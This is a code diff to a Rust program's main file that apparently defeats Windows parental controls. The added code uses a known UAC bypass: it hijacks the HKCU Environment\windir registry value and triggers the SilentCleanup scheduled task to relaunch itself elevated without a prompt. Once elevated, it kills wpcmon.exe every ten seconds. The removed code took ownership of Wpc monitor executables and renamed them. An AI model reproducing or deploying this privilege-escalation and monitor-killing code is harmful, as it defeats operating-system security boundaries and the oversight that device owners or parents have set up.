@@ -1,42 +1,32 @@
-mod admin;
-mod perms;
+mod is_elevated;
+mod kill;
+mod registry;
+mod tasks;
 
-use glob::{glob_with, MatchOptions};
-use std::{env, fs::rename};
-
-const GLOB_OPTIONS: MatchOptions = MatchOptions {
-  case_sensitive: false,
-  require_literal_separator: false,
-  require_literal_leading_dot: true
-};
+const WPCMON: &str = "wpcmon.exe";
 
 fn main() {
-  admin::elevate();
+  if !is_elevated::is_elevated() {
+    let value_path = &r"Environment\windir";
 
-  _main();
-}
-
-fn _main() {
-  for file in glob_with(
-    &format!(r"{}\**\Wpc[MT]o[nk].exe", env::var("SystemRoot").unwrap()),
-    GLOB_OPTIONS
-  )
-  .unwrap()
-  .filter_map(Result::ok)
-  {
-    let original_owner = perms::become_owner(&file);
-    let original_owner = original_owner.owner().unwrap();
-
-    rename(
-      &file,
-      format!(
-        r"{}\__{}",
-        file.parent().unwrap().display(),
-        file.file_name().unwrap().to_string_lossy()
-      )
+    // Add the "windir" registry key
+    registry::set_value(
+      registry::HKEY_CURRENT_USER,
+      value_path,
+      &format!("\"{}\"", std::env::current_exe().unwrap().to_string_lossy())
     )
     .unwrap();
 
-    perms::set_owner(&file, original_owner);
+    // Run the SilentCleanup task
+    tasks::run_task(&r"\Microsoft\Windows\DiskCleanup\SilentCleanup").unwrap();
+
+    // Delete the "windir" registry key
+    registry::delete_value(registry::HKEY_CURRENT_USER, value_path).unwrap();
+  } else {
+    loop {
+      kill::by_name(WPCMON);
+
+      std::thread::sleep(std::time::Duration::from_secs(10));
+    }
   }
 }
